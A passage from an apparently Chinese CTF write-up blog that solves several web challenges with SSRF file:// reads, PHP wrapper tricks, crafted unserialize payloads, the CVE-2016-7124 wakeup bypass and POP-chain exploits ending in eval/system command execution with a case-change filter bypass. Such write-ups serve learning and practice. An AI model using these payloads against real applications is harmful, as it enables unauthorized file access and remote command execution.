          <a href="#NISACTF-2022-easyssrf" class="heading-link"><i class="fas fa-link"></i></a><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h1>
      <p>访问之后提示<code>SSRF</code></p>
<p>那么访问一下本地网站下面的<code>index.php</code>，不太行，那试试<code>flag.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163522282.png" alt="image-20230107163522282"></p>
<p>再试试<code>/fl4g</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163611667.png" alt="image-20230107163611667"></p>
<p>不太行，试试<code>file</code>协议</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163829405.png" alt="image-20230107163829405"></p>
<p>访问一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163903762.png" alt="image-20230107163903762"></p>
<p>输出<code>file</code>，这里不用管那个判断，没啥用，只要<code>file</code>里面不包含<code>file</code>字符串就行，那么直接<code>/flag</code>就能得到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107164119474.png" alt="image-20230107164119474"></p>

        <h1 id="SWPUCTF-2021-新生赛-ez-unserialize"   >
          <a href="#SWPUCTF-2021-新生赛-ez-unserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="[SWPUCTF 2021 新生赛]ez_unserialize"></a>[SWPUCTF 2021 新生赛]ez_unserialize</h1>
      <p>访问啥也没有，<code>dirsearch</code>一下，发现<code>robots.txt</code>，访问一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107165705357.png" alt="image-20230107165705357"></p>
<p>接着访问<code>/cl45s.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107165729931.png" alt="image-20230107165729931"></p>
<p>可以看到反序列化设置一下对应属性即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28869/cl45s.php?p=O:4:%22wllm%22:2:&#123;s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:3:%22ctf%22;&#125;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107165833572.png" alt="image-20230107165833572"></p>

        <h1 id="SWPUCTF-2021-新生赛-no-wakeup"   >
          <a href="#SWPUCTF-2021-新生赛-no-wakeup" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="[SWPUCTF 2021 新生赛]no_wakeup"></a>[SWPUCTF 2021 新生赛]no_wakeup</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107170206722.png" alt="image-20230107170206722"></p>
<p>尝试用<code>CVE-2016-7124</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28150/class.php?p=O:6:%22HaHaHa%22:3:&#123;s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:4:%22wllm%22;&#125;</span><br></pre></td></tr></table></div></figure>

<p>成功</p>

        <h1 id="ZJCTF-2019-NiZhuanSiWei"   >
          <a href="#ZJCTF-2019-NiZhuanSiWei" class="heading-link"><i class="fas fa-link"></i></a><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1>
      <p>写过，首先用<code>data</code>流和<code>php</code>伪协议读取<code>useless.php</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=useless.php&amp;text=data://text/plain,welcome%20to%20the%20zjctf</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107170914355.png" alt="image-20230107170914355"></p>
<p>然后借助<code>tostring</code>方法，将<code>Flag-&gt;file</code>设置为<code>flag</code>即可，通过反序化打印出来</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=useless.php&amp;text=data://text/plain,welcome%20to%20the%20zjctf&amp;password=O:4:%22Flag%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>flag</code>在注释中</p>

        <h1 id="SWPUCTF-2021-新生赛-pop"   >
          <a href="#SWPUCTF-2021-新生赛-pop" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107174901023.png" alt="image-20230107174901023"></p>
<p>访问之后，可以看到考<code>pop</code>链，这里即为</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">w22m-&gt;__destruct()&#123;<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;w00m;&#125;</span><br><span class="line"><span class="comment">//设置成员$this-&gt;w00m为w33m类,进而调用到w33m-&gt;__toString</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">w33m-&gt;__toString()&#123;<span class="keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="keyword">$this</span>-&gt;w22m&#125;();&#125;</span><br><span class="line"><span class="comment">//设置成员$this-&gt;w00m为w44m类,$this-&gt;w22m为&quot;Getflag&quot;</span></span><br><span class="line"><span class="comment">//进而调用到w44m-&gt;Getflag()函数</span></span><br></pre></td></tr></table></div></figure>

<p>得到如下<code>exp</code></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$admin</span> = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$passwd</span> = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="string">&quot;flag&#123;aaaaa&#125;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="keyword">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w3Obj</span> = <span class="keyword">new</span> w33m();</span><br><span class="line"><span class="variable">$w2Obj</span> = <span class="keyword">new</span> w22m();</span><br><span class="line"><span class="variable">$w4Obj</span> = <span class="keyword">new</span> w44m();</span><br><span class="line"></span><br><span class="line"><span class="variable">$w2Obj</span>-&gt;w00m = <span class="variable">$w3Obj</span>;</span><br><span class="line"><span class="variable">$w3Obj</span>-&gt;w00m = <span class="variable">$w4Obj</span>;</span><br><span class="line"><span class="variable">$w3Obj</span>-&gt;w22m = <span class="string">&quot;Getflag&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$w2Obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;w44madmin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;*passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br></pre></td></tr></table></div></figure>

<p>之后由于<code>W44m</code>中<code>private</code>和<code>protected</code>的关系，打印不出来<code>\x00</code>这样的字符，所以我们需要按照规则使用<code>%00</code>进行补充</p>
<ul>
<li><p><code>private</code></p>
<p>变为<code>\x00className\x00memberName</code></p>
</li>
<li><p><code>public</code></p>
<p>仍然为原始的</p>
</li>
<li><p><code>protected</code></p>
<p>变为<code>\x00*\x00memberName</code></p>
</li>
</ul>
<p>最终得到<code>EXP</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?w00m=O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;%00w44m%00admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;%00*%00passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br></pre></td></tr></table></div></figure>

<p>得到<code>flag</code></p>

        <h1 id="NISACTF-2022-babyserialize"   >
          <a href="#NISACTF-2022-babyserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#NISACTF-2022-babyserialize" class="headerlink" title="[NISACTF 2022]babyserialize"></a>[NISACTF 2022]babyserialize</h1>
      <p>依据相关代码，主要是在<code>NISA.__invoke</code>中有如下代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108113757842.png" alt="image-20230108113757842"></p>
<p>那么只要调用到<code>NISA.__invoke</code>函数，并且控制<code>NISA.txw4ever</code>成员即可做到任意函数调用。</p>
<p>首先给出总的函数调用链</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TianXiWei.__wakeup-&gt;Ilovetxw.__call-&gt;four.__set-&gt;Ilovetxw.__toString-&gt;NISA.__invoke-&gt;@eval($this-&gt;txw4ever);</span><br></pre></td></tr></table></div></figure>

<p>接下来具体分析一下</p>
<ul>
<li><p><code>Ilovetxw.__toString-&gt;NISA.__invoke</code></p>
<p><code>Ilovetxw.__toString</code>方法如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108114004672.png" alt="image-20230108114004672"></p>
<p><code>__invoke</code>性质：当尝试以调用函数的方式调用对象的时候，就会调用该方法</p>
<p>那么通过设置<code>Ilovetxw.su</code>为某个<code>NISA</code>对应对象，即可调用到<code>NISA.__invoke</code></p>
</li>
<li><p><code>four.__set-&gt;Ilovetxw.__toString</code></p>
<p><code>four.__set</code>方法如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108120158522.png" alt="image-20230108120158522"></p>
<p>这里可以看到调用了<code>strtolower($this-&gt;a)</code>，查一下手册</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.strtolower.php" >PHP: strtolower - Manual</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108120354823.png" alt="image-20230108120354823"></p>
<p>可以看到会将传入变量转化为<code>String</code>，也就是说如果传入一个对象，那么就会调用该对象的<code>__toString</code>方法来将它转化为<code>String</code>。那么这里就将<code>four.a</code>设置为<code>Ilovetxw</code>对应对象，即可调用到<code>Ilovetxw.__toString</code></p>
</li>
<li><p><code>Ilovetxw.__call-&gt;four.__set</code></p>
<p><code>Ilovetxw.__call</code>方法如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108120814927.png" alt="image-20230108120814927"></p>
<p><code>__set</code>的相关性质：在给不可访问的<code>protected</code>或者<code>private</code>或者不存在的属性赋值的时候，会被调用</p>
<p>这里就可以设置<code>Ilovetxw-&gt;huang</code>为<code>four</code>的对象，而<code>four</code>中没有<code>fun</code>成员属性，所以就会调用到<code>four-&gt;__set</code>。</p>
</li>
<li><p><code>TianXiWei.__wakeup-&gt;Ilovetxw.__call</code></p>
<p><code>TianXiWei.__wakeup</code>方法如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121124426.png" alt="image-20230108121124426"></p>
<p><code>__call</code>相关性质：在对象中调用一个不可访问的方法的时候，会被执行</p>
<p>那么可以设置<code>TianXiwei-&gt;ext</code>为<code>Ilovetxw</code>对象，而<code>Ilovetxw</code>没有<code>nisa</code>方法，就会调用到<code>Ilovetxw-&gt;__call</code>方法。</p>
</li>
<li><p><code>TianXiWei.__wakeup</code></p>
<p>对于<code>__wakeup</code>的性质不用多说，在反序列化的时候就会自动调用了。</p>
</li>
</ul>
<p>相关总结如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">@eval($this-&gt;txw4ever);</span><br><span class="line">//设置NISA.txw4ever即可执行命令</span><br><span class="line"></span><br><span class="line">NISA.__invoke</span><br><span class="line">//通过Ilovetxw.__toString调用,需要设置IlovetxwObj.su为class NISA</span><br><span class="line">__invoke():当尝试以调用函数的方式调用对象的时候，就会调用该方法</span><br><span class="line"></span><br><span class="line">Ilovetxw.__toString</span><br><span class="line">//通过four.__set调用strtolower,从而调用到__toString。需要设置fourObj.a为class IlovetxwObj</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">four.__set</span><br><span class="line">//通过Ilovetxw.__call调用,需要设置IlovetxwObj.huang为class four</span><br><span class="line">__set():在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</span><br><span class="line"></span><br><span class="line">Ilovetxw.__call</span><br><span class="line">//通过TianXiWei.__wakeup调用，需要设置ext为class Ilovetxw</span><br><span class="line">__call():在对象中调用一个不可访问的方法的时候，会被执行</span><br><span class="line"></span><br><span class="line">TianXiWei.__wakeup</span><br><span class="line"></span><br><span class="line">unserialize(TianXiWei)调用TianXiWei.__wakeup</span><br></pre></td></tr></table></div></figure>

<p>那么最终的<code>EXP</code></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>)&#123;</span><br><span class="line">            <span class="comment">//hint();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;fun;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//checkcheck($this-&gt;txw4ever);</span></span><br><span class="line">        @<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext-&gt;nisa(<span class="keyword">$this</span>-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;huang-&gt;fun=<span class="variable">$arg</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="keyword">$this</span>-&gt;su;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>)&#123;</span><br><span class="line">            strtolower(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//func checkcheck($data)&#123;</span></span><br><span class="line"><span class="comment">//  if(preg_match(......))&#123;</span></span><br><span class="line"><span class="comment">//      die(something wrong);</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//function hint()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;.......&quot;;</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$TianXiWeiObj</span> = <span class="keyword">new</span> TianXiWei();</span><br><span class="line"><span class="variable">$IlovetxwObj</span> = <span class="keyword">new</span> Ilovetxw();</span><br><span class="line"></span><br><span class="line"><span class="variable">$TianXiWeiObj</span>-&gt;ext = <span class="variable">$IlovetxwObj</span>;  <span class="comment">//$this-&gt;ext-&gt;nisa($this-&gt;x);调用到Ilovetxw-&gt;__call();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fourObj</span> = <span class="keyword">new</span> four();</span><br><span class="line"><span class="variable">$IlovetxwObj</span>-&gt;huang = <span class="variable">$fourObj</span>; <span class="comment">//$this-&gt;huang-&gt;fun=$arg[0];调用到four-&gt;__set();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fourObj</span>-&gt;a = <span class="variable">$IlovetxwObj</span>;<span class="comment">//strtolower($this-&gt;a);调用到$IlovetxwObj.__toString();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$NISAObj</span> = <span class="keyword">new</span> NISA();</span><br><span class="line"><span class="variable">$IlovetxwObj</span>-&gt;su = <span class="variable">$NISAObj</span>;<span class="comment">// $bb = $this-&gt;su;return $bb();调用到NISA.__invoke();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$NISAObj</span>-&gt;txw4ever = <span class="string">&quot;System(&#x27;cat /fllllllaaag&#x27;);&quot;</span>;<span class="comment">//@eval($this-&gt;txw4ever);调用到system(&quot;ipconfig&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myString</span> = serialize(<span class="variable">$TianXiWeiObj</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$myString</span>);</span><br><span class="line"><span class="comment">//unserialize($myString); //调用TianXiWei.__invoke();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>首先可以看看<code>hint</code>中有啥，要将<code>NISA-&gt;fun</code>设置为<code>&quot;show_me_flag&quot;</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121600420.png" alt="image-20230108121600420"></p>
<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121739396.png" alt="image-20230108121739396"></p>
<p>然后改掉<code>NISA-&gt;fun</code>，因为<code>hint</code>函数中有<code>die</code>函数调用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121804523.png" alt="image-20230108121804523"></p>
<p>看看根目录有啥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3Br%3A2%3Bs%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3Bs%3A5%3A%22aaaaa%22%3Bs%3A8%3A%22txw4ever%22%3Bs%3A15%3A%22system%28%27ls+%2F%27%29%3B%22%3B%7D%7Ds%3A1%3A%22x%22%3BN%3B%7D</span><br></pre></td></tr></table></div></figure>

<p>发现有错</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121855956.png" alt="image-20230108121855956"></p>
<p>应该是<code>checkcheck</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121939989.png" alt="image-20230108121939989"></p>
<p>可能是<code>preg_match</code>进行了一些过滤，这里把<code>system</code>变成大写就行，查看根目录</p>
